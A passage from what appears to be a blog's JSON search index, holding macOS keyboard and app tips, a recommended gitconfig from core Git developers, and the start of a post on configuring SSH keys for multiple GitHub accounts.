\u003ccode\u003eOption\u003c/code\u003e while right-clicking the Finder dock icon and selecting Relaunch.\u003c/li\u003e\n\u003cli\u003eDrag a folder to the new tab button (only visible if multiple tabs are already open) to open the folder in a new tab.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘↑ to open the parent folder in a new window.\u003c/li\u003e\n\u003cli\u003eIf the toolbar is hidden (⌥⌘T), Finder will open folders in a new window.\u003c/li\u003e\n\u003cli\u003ePress ⌘R with an image selected to rotate it clockwise, and ⌘L to rotate it counter-clockwise.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"dock\"\u003eDock\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⌥⌘D to hide and show the dock.\u003c/li\u003e\n\u003cli\u003ePress ⌃F3 to move keyboard focus to the Dock. Then use the Left and Right arrow keys to select an app, or type the first few letters of an app. Press \u003ccode\u003eEnter\u003c/code\u003e to open the selected app, or press the Up arrow key to open the app\u0026rsquo;s menu.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eControl\u003c/code\u003e and \u003ccode\u003eShift\u003c/code\u003e while mousing over the Dock to temporarily turn on magnification.\u003c/li\u003e\n\u003cli\u003eQuickly move the Dock to a different side of the screen by holding \u003ccode\u003eShift\u003c/code\u003e while dragging the resize handle.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while resizing the Dock to resize in multiples of 16 points.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e and \u003ccode\u003eCommand\u003c/code\u003e while clicking a running app\u0026rsquo;s Dock icon to hide all other applications.\u003c/li\u003e\n\u003cli\u003eOpen a file in a specific application by dragging the file to the application\u0026rsquo;s Dock icon. If the application doesn\u0026rsquo;t accept the file type by default, force open the file by holding \u003ccode\u003eOption\u003c/code\u003e and \u003ccode\u003eCommand\u003c/code\u003e while dragging the file.\u003c/li\u003e\n\u003cli\u003eIf a dock icon is bouncing repeatedly, stop the bouncing by mousing over the icon.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eControl\u003c/code\u003e and \u003ccode\u003eCommand\u003c/code\u003e when right-clicking a Dock icon to only see the default system menu options.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e and \u003ccode\u003eCommand\u003c/code\u003e when clicking on a folder in the Dock to open the folder in a new Finder window.\u003c/li\u003e\n\u003cli\u003eTo open multiple items from a stack, hold \u003ccode\u003eOption\u003c/code\u003e while selecting an item to open it in the background while keeping the stack open.\u003c/li\u003e\n\u003cli\u003eAfter opening a stack, hover the cursor over an item and press the Space bar to preview the item with quick look.\u003c/li\u003e\n\u003cli\u003eRight-click the Launchpad dock icon to open an app from an inline menu.\u003c/li\u003e\n\u003cli\u003eIn Launchpad, hold \u003ccode\u003eOption\u003c/code\u003e to enter \u0026ldquo;jiggle mode\u0026rdquo; to re-arrange and delete apps.\u003c/li\u003e\n\u003cli\u003eTo add AirDrop to the Dock, navigate to \u003ccode\u003e/System/Library/CoreServices/Finder.app/Contents/Applications\u003c/code\u003e in Finder and drag the AirDrop icon to the Dock.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"spotlight\"\u003eSpotlight\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⌘B to search the web for the current query.\u003c/li\u003e\n\u003cli\u003ePress ⌘C to copy the full path to the selected file, or to copy the result of the current calculation.\u003c/li\u003e\n\u003cli\u003ePress ⌘D to open the Dictionary app with the current query.\u003c/li\u003e\n\u003cli\u003ePress ⌘L to jump to the dictionary section in the results (if present).\u003c/li\u003e\n\u003cli\u003ePress ⌘⏎ or ⌘R to reveal the selected file in Finder.\u003c/li\u003e\n\u003cli\u003eUse the \u003ccode\u003ename:\u003c/code\u003e filter to only search in the filename.\u003c/li\u003e\n\u003cli\u003eAdd \u003ccode\u003ekind:folder\u003c/code\u003e to only search for folder names.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e to show the path to the currently selected file.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"safari\"\u003eSafari\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eTab groups organize tabs spatially. Use ⌥⌘{↑,↓,←,→} to navigate tabs in 2D space.\u003c/li\u003e\n\u003cli\u003eWhen a video is playing, right click the speaker icon in the address bar or tab to enter Picture-in-Picture (PiP) mode.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while closing a tab to close all other tabs \u003cem\u003eexcept\u003c/em\u003e the current tab.\u003c/li\u003e\n\u003cli\u003eClick and hold the back button to see recent browsing history. Hold \u003ccode\u003eOption\u003c/code\u003e to see page URLs instead of page titles.\u003c/li\u003e\n\u003cli\u003eDrag selected text onto the Safari dock icon to quickly search the web for that text.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘T to re-open the most recently closed tab or window.\u003c/li\u003e\n\u003cli\u003eClick and hold on the new tab icon in the toolbar to view recently closed tabs.\u003c/li\u003e\n\u003cli\u003ePress the Space bar at the beginning of the address bar to change the search engine and to see recent web searches.\u003c/li\u003e\n\u003cli\u003eAdd \u003ccode\u003ekind:bookmark\u003c/code\u003e to Spotlight searches to search Safari bookmarks and browsing history.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eShift\u003c/code\u003e-click a link to add it to Reading List.\u003c/li\u003e\n\u003cli\u003eClick and hold a bookmark in the bookmarks bar to edit its display title.\u003c/li\u003e\n\u003cli\u003eOption-click the reload icon or press ⌥⌘R to force a fresh reload of the current webpage.\u003c/li\u003e\n\u003cli\u003eRight-click the reader icon in the address bar to automatically turn on Reader Mode for all pages on the current website.\u003c/li\u003e\n\u003cli\u003eAfter performing a web search and opening a result in the same tab, press ⌥⌘S to go back to the search results page.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘I to create a new email message with the contents of the current page.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e over the History \u0026gt; Clear History menu item to only clear browsing history while preserving website data.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘D while hovering over a link to open an inline preview of the link.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"mail\"\u003eMail\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eCommand\u003c/code\u003e-click multiple mailboxes in the left sidebar to simultaneously view all messages from the selected mailboxes.\u003c/li\u003e\n\u003cli\u003eSelect part of a message\u0026rsquo;s text before replying or forwarding to only include the selected text in the new message.\u003c/li\u003e\n\u003cli\u003eDrag a file to the Mail dock icon to compose a new message with the file already attached.\u003c/li\u003e\n\u003cli\u003ePress ⌥⇧⌘N to create a new tab.\u003c/li\u003e\n\u003cli\u003ePress the Space bar at the end of a message to go to the next message. Hold \u003ccode\u003eShift\u003c/code\u003e while pressing the Space bar at the top of a message to go to the previous message.\u003c/li\u003e\n\u003cli\u003eStart typing the first few characters of the sender, subject, or body to jump to that message in the messages list.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌘↑ and ⌥⌘↓ to jump to the top-most or bottom-most message in the messages list.\u003c/li\u003e\n\u003cli\u003eSave an extra copy of an important message by dragging it to the Finder.\u003c/li\u003e\n\u003cli\u003eIf a message bounces, use \u003ccode\u003eMessage \u0026gt; Send Again\u003c/code\u003e on the bounced message to re-send it to a different address.\u003c/li\u003e\n\u003cli\u003eTo add a message to multiple folders, hold Command while dragging the message to each folder.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘C to assign a color to a message.\u003c/li\u003e\n\u003cli\u003eDrag a message into the Notes or Reminders app to add a link to the message.\u003c/li\u003e\n\u003cli\u003ePress ⌘R and ⇧⌘R while replying to a message to switch between reply and reply-all.\u003c/li\u003e\n\u003cli\u003ePress ⌥⌫ to delete a message without automatically opening the next message.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eCommand\u003c/code\u003e-click on the currently selected message to unselect it.\u003c/li\u003e\n\u003cli\u003eIf a message has already been replied to, click on the reply icon in the message list to open the reply in a new window.\u003c/li\u003e\n\u003cli\u003eWhen creating a new mailbox, add a forward slash to create a nested mailbox.\u003c/li\u003e\n\u003cli\u003eAfter performing a search, select a mailbox from the left sidebar to filter the search to that mailbox.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eShift\u003c/code\u003e while launching Mail to reset the index.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"preview\"\u003ePreview\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ` to bring up a magnifier, and then press \u003ccode\u003e+\u003c/code\u003e and \u003ccode\u003e-\u003c/code\u003e to resize it.\u003c/li\u003e\n\u003cli\u003eIn a PDF document, re-order the pages in the document by re-ordering the pages in the sidebar.\u003c/li\u003e\n\u003cli\u003eMerge two PDF documents by dragging pages from one document\u0026rsquo;s sidebar to the other document\u0026rsquo;s sidebar.\u003c/li\u003e\n\u003cli\u003eIn the save dialog for an image, hold \u003ccode\u003eOption\u003c/code\u003e while opening the Format menu to access an extended list of formats.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e and the Space bar to activate the pan tool.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while in text selection mode to switch to rectangular text selection.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"calendar\"\u003eCalendar\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eHold \u003ccode\u003eShift\u003c/code\u003e while dragging an event to set a more precise time instead of snapping to 15-minute intervals.\u003c/li\u003e\n\u003cli\u003eClick and hold the \u003ccode\u003eAccept\u003c/code\u003e button in a calendar invite to change which calendar the event is accepted to.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while pressing the \u003ccode\u003eAccept\u003c/code\u003e button in a calendar invite to accept all events.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e while clicking any calendar\u0026rsquo;s checkbox in the left sidebar to show or hide all calendars.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eCommand\u003c/code\u003e and \u003ccode\u003eOption\u003c/code\u003e while clicking a calendar\u0026rsquo;s checkbox to only show that calendar.\u003c/li\u003e\n\u003cli\u003eAdd \u003ccode\u003ekind:event\u003c/code\u003e to Spotlight searches to search calendar events.\u003c/li\u003e\n\u003cli\u003eResize the mini-calendar in the bottom-left to preview more months.\u003c/li\u003e\n\u003cli\u003eWith an event selected, press ⌃⌥↑ and ⌃⌥↓ to adjust the time of the event. This also works with multiple events selected.\u003c/li\u003e\n\u003cli\u003eIn Week view, press ⌥⌘← and ⌥⌘→ to shift the view by a single day.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"messages\"\u003eMessages\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⌘R to directly reply to the latest message in the conversation.\nPress ⇧⌘R to reply to the latest thread in the conversation.\u003c/li\u003e\n\u003cli\u003ePress ⌘T to bring up the tapback selector for the latest message. Use the 1-6 number keys to select a reaction.\u003c/li\u003e\n\u003cli\u003ePress ⌘E to edit the latest sent message.\u003c/li\u003e\n\u003cli\u003ePress ⌥↑ and ⌥↓ in the message input field to cycle through previously sent messages.\u003c/li\u003e\n\u003cli\u003ePress ⌘1-9 to jump to a pinned conversation.\u003c/li\u003e\n\u003cli\u003eRight-click on a message and select Show Times to view exact timestamps for each message.\u003c/li\u003e\n\u003cli\u003eRight-click the Messages icon in the Dock to quickly view and jump to unread conversations.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"photos\"\u003ePhotos\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eDrag an item to the \u0026ldquo;My Albums\u0026rdquo; header section to quickly create an album with that item.\u003c/li\u003e\n\u003cli\u003eAfter adding an item to an album, use ⌃⌘A to add other items to that same album.\u003c/li\u003e\n\u003cli\u003eWhen editing an image, hold down the \u003ccode\u003eM\u003c/code\u003e key to compare the modifications to the original.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while launching Photos to choose a different photo library to open.\u003c/li\u003e\n\u003cli\u003eDrag a photo from the Photos app into a Finder window to quickly export the photo, or into the Mail or Messages app to attach the photo.\u003c/li\u003e\n\u003cli\u003eWhen editing an image, double-click an adjustment slider to reset it.\u003c/li\u003e\n\u003cli\u003eWhen editing an image, hold \u003ccode\u003eOption\u003c/code\u003e while holding the pointer over an adjustment slider to extend the adjustment range.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while clicking the rotate button to reverse the rotation direction.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eShift\u003c/code\u003e while cropping a photo to maintain the current aspect ratio, and hold \u003ccode\u003eOption\u003c/code\u003e to crop from the center of the photo.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"textedit\"\u003eTextEdit\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eIn rich text mode, press \u003ccode\u003eOption-Tab\u003c/code\u003e to insert an outlined list.\u003c/li\u003e\n\u003cli\u003ePress \u003ccode\u003eOption-Escape\u003c/code\u003e to autocomplete the current word.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌥⌘P in the find text field (⌘F) to access special search tokens.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while selecting text to make vertical text selections.\u003c/li\u003e\n\u003cli\u003eThe select line dialog (⌘L) supports the following formats:\n\u003ccode\u003e1-3\u003c/code\u003e selects lines 1-3 in the document\n\u003ccode\u003e+2\u003c/code\u003e selects the 2nd line below the cursor\n\u003ccode\u003e-2\u003c/code\u003e selects the 2nd line above the cursor\n\u003ccode\u003e+2-4\u003c/code\u003e selects 3 lines, starting from 2 lines below the cursor\n\u003ccode\u003e-2-4\u003c/code\u003e selects 3 lines, starting from 2 lines above the cursor\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"terminal\"\u003eTerminal\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⇧⌘A to select the output from the previous command.\u003c/li\u003e\n\u003cli\u003ePress ⌘L to clear the output from the previous command.\u003c/li\u003e\n\u003cli\u003ePress ⌃⌘V to paste and format text that is properly escaped for the shell.\u003c/li\u003e\n\u003cli\u003ePress ⌃T while a command is executing to view runtime statistics about the execution so far.\u003c/li\u003e\n\u003cli\u003ePress ⌘{↑,↓} to select the previous/next commands. Then press ⇧⌘A to select the output of the currently selected command.\u003c/li\u003e\n\u003cli\u003ePress ⇧⌘I to set a title for the current window and tab.\u003c/li\u003e\n\u003cli\u003eDrag a file or folder into a Terminal window to insert its full path. Alternatively, copy a file or folder in Finder and paste it in Terminal to insert its path.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"calculator\"\u003eCalculator\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003ePress ⌘T to open a new window that keeps a running history of calculations.\u003c/li\u003e\n\u003cli\u003ePress ⌘R to enable Reverse Polish notation (RPN) mode.\u003c/li\u003e\n\u003cli\u003ePress \u003ccode\u003ep\u003c/code\u003e to insert pi.\u003c/li\u003e\n\u003cli\u003eRight-click the number display and select \u0026ldquo;Large Type\u0026rdquo; to view the current result in a large overlay window.\u003c/li\u003e\n\u003cli\u003eUse the Convert menu to perform various unit conversions.\u003c/li\u003e\n\u003cli\u003eIn Programmer view (⌘3), click the individual binary bits to toggle between 0 and 1.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"quicktime-player\"\u003eQuickTime Player\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eGrab a single frame from a video by pausing on the desired frame (using the Left and Right arrow keys to navigate individual frames) and pressing ⌘C.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"photo-booth\"\u003ePhoto Booth\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eHold \u003ccode\u003eOption\u003c/code\u003e while taking a picture to skip the countdown.\u003c/li\u003e\n\u003cli\u003eHold \u003ccode\u003eShift\u003c/code\u003e while taking a picture to disable the screen flash.\u003c/li\u003e\n\u003cli\u003eWhen choosing one of the distortion effects (on the third page), click and drag the cursor on the image preview to change the effects origin.\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","macOS"],"title":"macOS Tips \u0026 Tricks"},{"categories":["URL","Git"],"contents":" How Core Git Developers Configure Git # clearly makes git better [column] ui = auto [branch] sort = -committerdate [tag] sort = version:refname [init] defaultBranch = main [diff] algorithm = histogram colorMoved = plain mnemonicPrefix = true renames = true [push] default = simple autoSetupRemote = true followTags = true [fetch] prune = true pruneTags = true all = true # why the hell not? [help] autocorrect = prompt [commit] verbose = true [rerere] enabled = true autoupdate = true [core] excludesfile = ~/.gitignore [rebase] autoSquash = true autoStash = true updateRefs = true # a matter of taste (uncomment if you dare) [core] # fsmonitor = true # untrackedCache = true [merge] # (just \u0026#39;diff3\u0026#39; if git version \u0026lt; 2.3) # conflictstyle = zdiff3 [pull] # rebase = true ","date":"March 7, 2025","hero":"/images/hero/git.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250307-how-git-core-devs-configure-git/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.gitbutler.com/how-git-core-devs-configure-git/\" target=\"_blank\" rel=\"noopener\"\u003eHow Core Git Developers Configure Git\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# clearly makes git better\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecolumn\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ui \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e auto\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ebranch\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        sort \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e -committerdate\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003etag\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        sort \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e version:refname\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003einit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        defaultBranch \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ediff\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        algorithm \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e histogram\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        colorMoved \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e plain\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        mnemonicPrefix \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        renames \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003epush\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        default \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e simple\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autoSetupRemote \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        followTags \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003efetch\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        prune \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        pruneTags \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        all \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# why the hell not?\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ehelp\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autocorrect \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e prompt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecommit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        verbose \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ererere\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        enabled \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autoupdate \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecore\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        excludesfile \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e ~/.gitignore\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003erebase\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autoSquash \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        autoStash \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        updateRefs \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e true\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# a matter of taste (uncomment if you dare)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003ecore\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# fsmonitor = true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# untrackedCache = true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003emerge\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# (just \u0026#39;diff3\u0026#39; if git version \u0026lt; 2.3)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# conflictstyle = zdiff3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003epull\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#75715e\"\u003e# rebase = true\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Git"],"title":"How Core Git Developers Configure Git"},{"categories":["URL","command line","SSH","Github"],"contents":" Configuring SSH Keys for Multiple GitHub Accounts Use Different Host values Host github.com HostName github.com User git IdentityFile ~/.ssh/id_fry_ed25519 Host github-plnx HostName github.com User git IdentityFile ~/.ssh/id_fry_plnx_ed25519 # Instead of the actual URL $ git clone git@github.com:planet-express/delivery_service.git # Substitue in our custom Host value for the `github.com` part $ git clone git@github-plnx:planet-express/delivery_service.git Automate Substituting the Host [include] path = ~/.gitconfig_custom # See custom `Host github-plnx` in ~/.ssh/config [url \u0026#34;github-plnx:planet-express\u0026#34;] insteadOf = git@github.com:planet-express ","date":"February 11, 2025","hero":"/images/hero/github.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2025/20250211-configure-ssh-keys-for-multiple-github-accounts/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://stevenharman.net/configure-ssh-keys-for-multiple-github-accounts\" target=\"_blank\" rel=\"noopener\"\u003eConfiguring SSH Keys for Multiple GitHub Accounts\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"use-different-host-values\"\u003eUse Different Host values\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  HostName github.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  User git\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  IdentityFile ~/.ssh/id_fry_ed25519\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost github-plnx\n\u003c/span\u003e\u003c/span\u003e\u003cspan 